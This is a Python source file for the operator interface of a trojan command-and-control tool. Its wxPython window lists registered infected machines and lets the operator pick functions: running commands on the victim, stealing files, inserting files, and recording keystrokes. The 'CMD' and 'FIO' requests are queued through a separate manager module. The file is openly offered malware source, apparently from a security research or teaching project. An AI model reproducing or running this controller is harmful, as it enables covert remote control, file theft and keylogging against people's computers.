#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        trojanReceiver.py
#
# Purpose:     This module is the receiver UI program used to receive the trojan
#              report and issue the control request to mutiple trojans.
# 
# Author:      Yuancheng Liu
#
# Created:     2010/10/26
# Version:     v0.1.2
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License  
#-----------------------------------------------------------------------------

import time
import wx
import trojanReceiverGlobal as gv
import trojanReceiverMgr

PERIODIC = 500      # update in every 500ms

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class UIFrame(wx.Frame):
    """ Main UI frame window."""
    def __init__(self, parent, id, title):
        """ Init the UI and parameters """
        wx.Frame.__init__(self, parent, id, title, size=(900, 500))
        # No boader frame:
        self.SetBackgroundColour(wx.Colour(200, 210, 200))
        # self.SetBackgroundColour(wx.Colour(39, 40, 62)))
        self.SetIcon(wx.Icon(gv.ICO_PATH))
        self.trojanIDList = [0]
        self.trojanChoiceList = ['Trojan-ID:0']
        # Build UI sizer
        self.SetSizer(self._buidUISizer())
        # Set the periodic call back
        self.lastPeriodicTime = time.time()
        self.timer = wx.Timer(self)
        self.updateLock = False
        self.Bind(wx.EVT_TIMER, self.periodic)
        self.timer.Start(PERIODIC)  # every 500 ms
        # Init the trojan manager and start the accept server 
        gv.iDataMgr = trojanReceiverMgr.trojanReceiverMgr(self)
        gv.iDataMgr.start()

    #-----------------------------------------------------------------------------
    def _buidUISizer(self):
        """ Build the main UI Sizer. """
        flagsR = wx.CENTER
        mSizer = wx.BoxSizer(wx.HORIZONTAL)
        mSizer.AddSpacer(3)

        # Build left side controller area:
        lSizer = wx.BoxSizer(wx.VERTICAL)
        lSizer.AddSpacer(10)          
        bm = wx.StaticBitmap(self, -1, wx.Bitmap(gv.LOGO_PATH, wx.BITMAP_TYPE_ANY))
        lSizer.Add(bm, flag=wx.LEFT, border=2)
        lSizer.AddSpacer(10)
        self.trojanCountLB = wx.StaticText(self, label=" Current register tojan number : [ %s ]" %str(len(self.trojanIDList)))
        lSizer.Add(self.trojanCountLB, flag=wx.LEFT, border=2)
        lSizer.AddSpacer(10)

        lSizer.Add(wx.StaticText(self, label=" Follow below steps to assign a task to the trojan : "),
                  flag=wx.LEFT, border=2)
        lSizer.AddSpacer(10)

        lSizer.Add(wx.StaticText(self, label=" 1. Select the reported trojan : "),
                  flag=wx.LEFT, border=2)
        lSizer.AddSpacer(5)
        self.trojanChoice = wx.Choice(self, size = (200, 30), choices = self.trojanChoiceList)
        lSizer.Add(self.trojanChoice, flag=wx.LEFT, border=2)
        lSizer.AddSpacer(5)
        lSizer.Add(wx.StaticText(self, label=" 2. Select the trojan's function : "),
                  flag=wx.LEFT, border=2)
        functionList = [
            '1. Run a command and check execution result.',
            '2. Steal a file from the victim machine.',
            '3. Insert a file into the victim machine.',
            '4. Start to record users keyboard input.',
            '5. [Todo] Full fill users home folder.',
            '6. [Todo] Freeze user mouse and keyboard.'
        ]
        self.funcChoice = wx.Choice(self, size = (300, 30), choices = functionList)
        lSizer.Add(self.funcChoice, flag=wx.LEFT, border=2)
        lSizer.AddSpacer(5)
        lSizer.Add(wx.StaticText(self, label=" 3. Input the function parameter : "),
                  flag=wx.LEFT, border=2)
        self.actParm = wx.TextCtrl(self, size=(300, 30)) 
        lSizer.Add(self.actParm, flag=wx.LEFT, border=2)

        lSizer.AddSpacer(20)
        self.runBt = wx.Button(self, label='Execute', size=(80, 22))
        self.runBt.Bind(wx.EVT_BUTTON, self.onExecuteAction)

        lSizer.Add(self.runBt, flag=wx.LEFT, border=2)
        mSizer.Add(lSizer, flag=wx.LEFT, border=2)
        mSizer.AddSpacer(5)
        mSizer.Add(wx.StaticLine(self, wx.ID_ANY, size=(-1, 470),
                        style=wx.LI_VERTICAL), flag=wx.LEFT, border=2)
        mSizer.AddSpacer(5)
        self.detailTC = wx.TextCtrl(self, size=(550, 450), style=wx.TE_MULTILINE)
        mSizer.Add(self.detailTC, flag=flagsR, border=10)

        mSizer.AddSpacer(3)
        return mSizer

    #-----------------------------------------------------------------------------
    def setTrojanList(self, trojanId):
        """ Add a new registered trojan in the trojan selection list.
        Args:
            trojanId (_type_): trojanID.
        """
        trojanId = int(trojanId)
        if trojanId in self.trojanIDList: return
        self.trojanIDList.append(trojanId) 
        self.trojanChoice.AppendItems('Trojan-ID:%s' %str(trojanId))
        self.trojanCountLB.SetLabel(" Current register tojan number : [ %s ]" %str(len(self.trojanIDList)))

    #-----------------------------------------------------------------------------
    def updateTFDetail(self, data):
        """ Update the data in the detail text field. Input 'None' will clear the 
            detail information in text field.
        """
        if data is None:
            self.detailTC.Clear()
        else:
            self.detailTC.AppendText(" - %s \n" %str(data))

    #-----------------------------------------------------------------------------
    def onExecuteAction(self, event):
        self.updateTFDetail(None)
        trojanID = self.trojanIDList[int(self.trojanChoice.GetSelection())]
        actionSelect = self.funcChoice.GetSelection()
        request = None
        requestType = None
        if actionSelect == 0:
            # run cmd and show the result
            request = 'CMD;detail;'+self.actParm.GetValue()
            requestType = 'CMD'
        elif actionSelect == 1:
            request = 'FIO;out;'+self.actParm.GetValue()

        if gv.iDataMgr:
            gv.iDataMgr.setNextExeDict(trojanID, requestType, request)

    #-----------------------------------------------------------------------------
    def periodic(self, event):
        """ Call back every periodic time."""
        now = time.time()
        if (not self.updateLock) and now - self.lastPeriodicTime >= gv.gUpdateRate:
            #print("main frame update at %s" % str(now))
            self.lastPeriodicTime = now

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class MyApp(wx.App):
    def OnInit(self):
        gv.iMainFrame = UIFrame(None, -1, gv.APP_NAME)
        gv.iMainFrame.Show(True)
        return True

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    app = MyApp(0)
    app.MainLoop()
